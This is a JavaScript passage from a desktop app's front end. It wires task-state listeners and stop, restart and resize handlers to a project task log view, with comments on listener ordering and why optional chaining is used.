registerTaskListener('onTaskStateChanged', run => applyTaskRun(run));

registerTaskListener('onProjectTasksChanged', async projectPath => {
  let result;
  try { result = await window.api.listProjectTasks(projectPath); } catch { return; }
  tasksByPath.set(projectPath, { tasks: result.tasks || [], error: result.error || null, hasTaskFile: !!result.hasTaskFile });
  for (const projects of [cachedProjects, cachedAllProjects]) {
    const project = projects.find(item => item.projectPath === projectPath);
    if (!project) continue;
    project.tasks = result.tasks || [];
    project.taskError = result.error || null;
    project.hasTaskFile = !!result.hasTaskFile;
  }
  closeTaskPopover();
  refreshSidebar();
});

// #terminal-stop-btn already carries app.js:802's session handler. Adding a
// second listener is safe because each is guarded by its own mode: app.js's
// runs only when activeSessionId is set, and showTaskLog clears it.
document.getElementById('terminal-stop-btn')?.addEventListener('click', async () => {
  if (!activeTaskView) return;
  const { projectPath, label } = activeTaskView;
  const result = await window.api.stopTask(projectPath, label);
  if (result.ok) {
    const run = await window.api.getTaskRun(projectPath, label);
    applyTaskRun(run);
  }
});

// #terminal-restart-task-btn IS present (index.html:106) -- the harvest note
// claiming otherwise was wrong. Still optional-chained: upstream dereferences
// it directly, and if the element is ever dropped that would throw here and
// abort the rest of this script, taking every listener below it with it.
document.getElementById('terminal-restart-task-btn')?.addEventListener('click', async () => {
  if (!activeTaskView) return;
  const { projectPath, label } = activeTaskView;
  await restartProjectTask(projectPath, label);
});

window.addEventListener('resize', () => {
  if (!activeTaskView) return;
  const entry = taskLogViews.get(taskViewKey(activeTaskView.projectPath, activeTaskView.label));
  if (entry) fitTaskLog(entry);
});
